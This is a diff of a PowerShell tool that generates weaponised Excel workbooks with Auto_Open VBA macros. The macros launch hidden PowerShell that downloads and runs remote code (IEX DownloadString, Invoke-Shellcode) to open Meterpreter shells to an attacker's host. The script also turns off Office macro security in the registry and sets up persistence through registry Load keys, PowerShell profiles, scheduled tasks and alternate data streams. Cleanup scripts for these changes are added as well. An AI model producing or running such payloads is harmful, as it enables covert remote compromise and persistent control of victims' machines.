@@ -72,7 +72,6 @@ Uses registry to persist after reboot
 .DESCRIPTION
 Drops a hidden VBS file and creates a registry key to execute is on startup
 #>
-
 #create macro
 
 $Code = @"
@@ -101,7 +100,7 @@ Public Function Persist() As Variant
     Set a = fs.CreateTextFile("C:\Users\Public\config.txt", True)
     a.WriteLine ("Dim objShell")
     a.WriteLine ("Set objShell = WScript.CreateObject(""WScript.Shell"")")
-    a.WriteLine ("command = ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -WindowStyle Hidden -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-SHellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force""")
+    a.WriteLine ("command = ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -WindowStyle Hidden -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force""")
     a.WriteLine ("objShell.Run command,0")
     a.WriteLine ("Set objShell = Nothing")
     a.Close
@@ -144,10 +143,10 @@ $Excel01.Visible = $false
 $Workbook01 = $Excel01.Workbooks.Add(1)
 $Worksheet01 = $Workbook01.WorkSheets.Item(1)
 
-
-
 $ExcelModule = $Workbook01.VBProject.VBComponents.Add(1)
 $ExcelModule.CodeModule.AddFromString($Code)
+
+
 
 
 #Save the document
@@ -165,6 +164,26 @@ if (ps excel){kill -name excel}
 #Enable Macro Security
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null
+
+#Create Clean-up Script
+New-Item $env:userprofile\Desktop\RegistryCleanup.ps1 -type file | Out-Null
+$RegistryCleanup = @'
+if(Test-Path "C:\Users\Public\config.vbs"){
+try{
+Remove-Item "C:\Users\Public\config.vbs" -Force
+Write-Host "[*]Successfully Removed config.vbs from C:\Users\Public"}catch{Write-Host "[!]Unable to remove config.vbs from C:\Users\Public"}
+}else{Write-Host "[!]Path not valid"}
+$Reg = "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows"
+$RegQuery = Get-ItemProperty $Reg | Select-Object "Load"
+if($RegQuery.Load -eq "C:\Users\Public\config.vbs"){
+try{
+Remove-ItemProperty -Path $Reg -Name "Load"
+Write-Host "[*]Successfully Removed Malicious Load entry from HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows"}catch{Write-Host "[!]Unable to remove Registry Entry"}
+}else{Write-Host "[!]Path not valid"}
+'@
+Add-Content $env:userprofile\Desktop\RegistryCleanup.ps1 $RegistryCleanup
+Write-Host "Clean-up Script located at $env:userprofile\Desktop\RegistryCleanup.ps1"
+
 
 }
 
@@ -274,26 +293,48 @@ if (ps excel){kill -name excel}
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null
 
+#Create Clean-up Script
+New-Item $env:userprofile\Desktop\PowerShellProfileCleanup.ps1 -type file | Out-Null
+$PowerShellProfileCleanup = @'
+if(Test-Path "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookie.vbs"){
+try{
+Remove-Item "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookie.vbs" -Force
+Write-Host "[*]Successfully Removed cookie.vbs from C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies"}catch{Write-Host "[!]Unable to remove cookie.vbs from C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies"}
+}else{Write-Host "[!]Path not valid"}
+if(Test-Path "C:\Windows\System32\WindowsPowerShell\v1.0\Profile.ps1"){
+try{
+Remove-Item "C:\Windows\System32\WindowsPowerShell\v1.0\Profile.ps1" -Force
+Write-Host "[*]Successfully Removed Profile.ps1 from C:\Windows\System32\WindowsPowerShell\v1.0"}catch{Write-Host "[!]Unable to remove Profile.ps1 from C:\Windows\System32\WindowsPowerShell\v1.0"}
+}else{Write-Host "[!]Path not valid"}
+$Reg = "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows"
+$RegQuery = Get-ItemProperty $Reg | Select-Object "Load"
+if($RegQuery.Load -eq "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookie.vbs"){
+try{
+Remove-ItemProperty -Path $Reg -Name "Load"
+Write-Host "[*]Successfully Removed Malicious Load entry from HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows"}catch{Write-Host "[!]Unable to remove Registry Entry"}
+}else{Write-Host "[!]Path not valid"}
+'@
+Add-Content $env:userprofile\Desktop\PowerShellProfileCleanup.ps1 $PowerShellProfileCleanup
+Write-Host "Clean-up Script located at $env:userprofile\Desktop\PowerShellProfileCleanup.ps1"
 }
 
-
-
-
-function Outlook-Persistence{
-$Email = Read-Host "Enter Attacker Email Address"
-$Trigger = Read-Host "Enter Trigger Word"
+function SchTaskPersistence{
+$TimeDelay = Read-Host "Enter User Idle Time before the task runs"
+$TaskName = Read-Host "Enter the name you want the task to be called"
 $Code = @"
+'Coded by Matt Nelson
+'twitter.com/enigma0x3
+'enigma0x3.wordpress.com
+
 Sub Auto_Open()
+
 Execute
-Download
-Configure
-WriteWrapper
-Reg
-Start
+Persist
+
 
 End Sub
 
- Public Function Execute() As Variant
+Public Function Execute() As Variant
         Const HIDDEN_WINDOW = 0
         strComputer = "."
         Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
@@ -304,105 +345,114 @@ End Sub
         Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
         objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
      End Function
-     
-Public Function Download() As Variant
-
-    Dim FileNum As Long
-    Dim FileData() As Byte
-    Dim MyFile As String
-    Dim WHTTP As Object
-
-    On Error Resume Next
-    Set WHTTP = CreateObject("WinHTTP.WinHTTPrequest.5")
-    If Err.Number <> 0 Then
-        Set WHTTP = CreateObject("WinHTTP.WinHTTPrequest.5.1")
-    End If
-    On Error GoTo 0
-    
-    MyFile = "http://goo.gl/PBjwWR"
-    
-    WHTTP.Open "GET", MyFile, False
-    WHTTP.Send
-    FileData = WHTTP.ResponseBody
-    Set WHTTP = Nothing
-    
-    FileNum = FreeFile
-    Open "C:\Users\Public\configuration.ps1" For Binary Access Write As #FileNum
-    Put #FileNum, 1, FileData
-    Close #FileNum
- 
-End Function
-
-Public Function Configure() As Variant
 
 
-Dim fso As Object
-Dim txtStr As Object
-Dim strHolder As String
-Dim strFileToFix As String
-
-strFileToFix = "C:\Users\Public\configuration.ps1"
-Set fso = CreateObject("Scripting.FileSystemObject")
-Set txtStr = fso.opentextfile(strFileToFix, 1, False, 0)
-strHolder = txtStr.readall
-txtStr.Close
-Set txtStr = Nothing
-strHolder = Replace(strHolder, "ATTACKEREMAIL@EMAIL.COM", "$Email", 1, -1, vbTextCompare)
-Set txtStr = fso.CreateTextFile(strFileToFix, True, False)
-txtStr.Write (strHolder)
-txtStr.Close
-Set txtStr = Nothing
-strHolder = Replace(strHolder, "EMAILSUBJECT", "$Trigger", 1, -1, vbTextCompare)
-Set txtStr = fso.CreateTextFile(strFileToFix, True, False)
-txtStr.Write (strHolder)
-txtStr.Close
-Set txtStr = Nothing
-strHolder = Replace(strHolder, "xxx.xxx.xx.xxx", "$global:IP", 1, -1, vbTextCompare)
-Set txtStr = fso.CreateTextFile(strFileToFix, True, False)
-txtStr.Write (strHolder)
-txtStr.Close
-Set txtStr = Nothing
-strHolder = Replace(strHolder, "yyyy", "$global:Port", 1, -1, vbTextCompare)
-Set txtStr = fso.CreateTextFile(strFileToFix, True, False)
-txtStr.Write (strHolder)
-txtStr.Close
-Set txtStr = Nothing
-
-SetAttr "C:\Users\Public\configuration.ps1", vbHidden
-
-End Function
-
-Public Function WriteWrapper() As Variant
-Set fs = CreateObject("Scripting.FileSystemObject")
-    Set a = fs.CreateTextFile("C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookies.txt", True)
-    a.WriteLine ("Dim objShell")
-    a.WriteLine ("Set objShell = WScript.CreateObject(""WScript.Shell"")")
-    a.WriteLine ("command = ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -file C:\Users\Public\configuration.ps1""")
-    a.WriteLine ("objShell.Run command,0")
-    a.WriteLine ("Set objShell = Nothing")
-    a.Close
-    GivenLocation = "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\"
-    OldFileName = "cookies.txt"
-    NewFileName = "cookies.vbs"
-    Name GivenLocation & OldFileName As GivenLocation & NewFileName
-    SetAttr "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookies.vbs", vbHidden
-
-End Function
-
-
-Public Function Reg() As Variant
-Set WshShell = CreateObject("WScript.Shell")
-WshShell.RegWrite "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load", "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookies.vbs", "REG_SZ"
-Set WshShell = Nothing
-
-End Function
-
-Public Function Start() As Variant
- Const HIDDEN_WINDOW = 0
+Public Function Persist() As Variant
+        Const HIDDEN_WINDOW = 0
         strComputer = "."
-        Shell "wscript C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookies.vbs", vbNormalFocus
-      
-End Function
+        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+        
+        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+        Set objConfig = objStartup.SpawnInstance_
+        objConfig.ShowWindow = HIDDEN_WINDOW
+        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+        objProcess.Create "Powershell.exe -ep Bypass -WindowStyle Hidden -nop -noexit -c Invoke-Command -ScriptBlock { schtasks /create  /TN $TaskName /TR 'powershell.exe -ep Bypass -WindowStyle hidden -noexit -c ''IEX ((New-Object Net.WebClient).DownloadString(''''$global:IS_Url''''''))''; Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force' /SC onidle /i $TimeDelay}", Null, objConfig, intProcessID
+     End Function
+
+
+"@
+
+
+
+#Create excel document
+$Excel01 = New-Object -ComObject "Excel.Application"
+$ExcelVersion = $Excel01.Version
+
+#Disable Macro Security
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null
+
+
+$Excel01.DisplayAlerts = $false
+$Excel01.DisplayAlerts = "wdAlertsNone"
+$Excel01.Visible = $false
+$Workbook01 = $Excel01.Workbooks.Add(1)
+$Worksheet01 = $Workbook01.WorkSheets.Item(1)
+
+
+
+$ExcelModule = $Workbook01.VBProject.VBComponents.Add(1)
+$ExcelModule.CodeModule.AddFromString($Code)
+
+
+#Save the document
+Add-Type -AssemblyName Microsoft.Office.Interop.Excel
+$Workbook01.SaveAs("$global:FullName", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
+Write-Output "Saved to file $global:Fullname"
+
+#Cleanup
+$Excel01.Workbooks.Close()
+$Excel01.Quit()
+[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel01) | out-null
+$Excel01 = $Null
+
+#Enable Macro Security
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null
+
+#Create Clean-up Script
+New-Item $env:userprofile\Desktop\SchTaskCleanup.ps1 -type file | Out-Null
+$SchTaskCleanup = @"
+`$TaskName = "$TaskName"
+`$CheckTask = SCHTASKS /QUERY /TN $TaskName
+try{
+SCHTASKS /Delete /TN $TaskName /F
+}catch{Write-Host "[!]Unable to remove malicious task named $TaskName"}
+"@
+Add-Content $env:userprofile\Desktop\SchTaskCleanup.ps1 $SchTaskCleanup
+Write-Host "Clean-up Script located at $env:userprofile\Desktop\SchTaskCleanup.ps1"
+}
+
+
+function AltDS-Persistence{
+$AltDSURL = Read-Host "Enter URL of hosted Alternate Data Stream Persistence Script"
+
+$Code = @"
+'Coded by Matt Nelson
+'twitter.com/enigma0x3
+'enigma0x3.wordpress.com
+
+Sub Auto_Open()
+
+Execute
+ADSPersist
+
+
+End Sub
+
+Public Function Execute() As Variant
+        Const HIDDEN_WINDOW = 0
+        strComputer = "."
+        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+         
+        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+        Set objConfig = objStartup.SpawnInstance_
+        objConfig.ShowWindow = HIDDEN_WINDOW
+        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
+     End Function
+	 
+Public Function ADSPersist() As Variant
+        Const HIDDEN_WINDOW = 0
+        strComputer = "."
+        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+         
+        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+        Set objConfig = objStartup.SpawnInstance_
+        objConfig.ShowWindow = HIDDEN_WINDOW
+        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$AltDSURL')); Invoke-ADSBackdoor -URL $global:IS_Url -Arguments 'Invoke-Shellcode -Payload $Payload -LHost $global:IP -LPort $global:Port -Force'", Null, objConfig, intProcessID
+     End Function
 
 
 
@@ -447,6 +497,114 @@ if (ps excel){kill -name excel}
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null
 
+#Create Clean-up Script
+New-Item $env:userprofile\Desktop\AltDSCleanup.ps1 -type file | Out-Null
+$AltDSCleanup = @'
+function Remove-ADS {
+<#
+.SYNOPSIS
+Removes an alterate data stream from a specified location.
+P/Invoke code adapted from PowerSploit's Mayhem.psm1 module.
+Author: @harmj0y, @mattifestation
+License: BSD 3-Clause
+
+.LINK
+https://github.com/mattifestation/PowerSploit/blob/master/Mayhem/Mayhem.psm1
+
+#>
+    [CmdletBinding()] Param(
+        [Parameter(Mandatory=$True)]
+        [string]$ADSPath
+    )
+ 
+    #region define P/Invoke types dynamically
+    #   stolen from PowerSploit https://github.com/mattifestation/PowerSploit/blob/master/Mayhem/Mayhem.psm1
+    $DynAssembly = New-Object System.Reflection.AssemblyName('Win32')
+    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32', $False)
+ 
+    $TypeBuilder = $ModuleBuilder.DefineType('Win32.Kernel32', 'Public, Class')
+    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
+    $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
+    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor,
+        @('kernel32.dll'),
+        [Reflection.FieldInfo[]]@($SetLastError),
+        @($True))
+ 
+    # Define [Win32.Kernel32]::DeleteFile
+    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('DeleteFile',
+        'kernel32.dll',
+        ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
+        [Reflection.CallingConventions]::Standard,
+        [Bool],
+        [Type[]]@([String]),
+        [Runtime.InteropServices.CallingConvention]::Winapi,
+        [Runtime.InteropServices.CharSet]::Ansi)
+    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
+    
+    $Kernel32 = $TypeBuilder.CreateType()
+    
+    $Result = $Kernel32::DeleteFile($ADSPath)
+
+    if ($Result){
+        Write-Verbose "Alternate Data Stream at $ADSPath successfully removed."
+    }
+    else{
+        Write-Verbose "Alternate Data Stream at $ADSPath removal failure!"
+    }
+
+    $Result
+}
+
+
+function Remove-ADSBackdoor {
+<#
+.SYNOPSIS
+Removes the backdoor installed by Invoke-ADSBackdoor.
+
+.DESCRIPTION
+This function will remove the persistence installed by Invoke-ADSBackdoor by parsing
+the run registry run key, removing the alternate data stream files, and then
+removing the registry key.
+#>
+
+    # get the VBS trigger command/file location from the registry
+    $trigger = (gp HKCU:\Software\Microsoft\Windows\CurrentVersion\Run Update).Update
+    $vbsFile = $trigger.split(" ")[1]
+    $getWrapperADS = {cmd /C "more <  $vbsFile"}
+    $wrapper = Invoke-Command -ScriptBlock $getWrapperADS
+
+    if ($wrapper -match 'i in \((.+?)\)')
+    {
+        # extract out the payload .txt file location
+        $textFile = $matches[1]
+        if($( Remove-ADS $textFile)){
+            "Successfully removed payload file $textFile"
+        }
+        else{
+            "[!] Error in removing payload file $textFile"
+        }
+        
+    }
+    else{
+        "[!] Error: couldn't extract PowerShell script location from VBS wrapper $vbsFile"
+    }
+
+    if($(Remove-ADS $vbsFile)){
+        "Successfully removed wrapper file $vbsFile"
+    }
+    else{
+         "[!] Error in removing payload file $textFile"
+    }
+
+    # remove the registry run key
+    Remove-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update;
+    "Successfully removed Malicious Update entry from HKCU:Software\Microsoft\Windows\CurrentVersion\Run"
+}
+Remove-ADSBackdoor
+'@
+Add-Content $env:userprofile\Desktop\AltDSCleanup.ps1 $AltDSCleanup
+Write-Host "Clean-up Script located at $env:userprofile\Desktop\AltDSCleanup.ps1"
 }
 
 
@@ -457,10 +615,11 @@ Write-Host "
 --------Select Attack---------
 1. Meterpreter Shell with Logon Persistence
 2. Meterpreter Shell with Powershell Profile Persistence (Requires user to be local admin)
-3. Meterpreter Shell with Microsoft Outlook Email Persistence
+3. Meterpreter Shell with Alternate Data Stream Persistence
+4. Meterpreter Shell with Scheduled Task Persistence
 ------------------------------"
 $AttackNum = Read-Host -prompt "Select Attack Number & Press Enter"
-} until ($AttackNum -eq "1" -or $AttackNum -eq "2" -or $AttackNum -eq "3")
+} until ($AttackNum -eq "1" -or $AttackNum -eq "2" -or $AttackNum -eq "3" -or $AttackNum -eq "4")
 
 
 
@@ -487,5 +646,8 @@ elseif($AttackNum -eq "2"){
     PowerShellProfile-Persistence
 }
 elseif($AttackNum -eq "3"){
-Outlook-Persistence
+AltDS-Persistence
+}
+elseif($AttackNum -eq "4"){
+SchTaskPersistence
 }
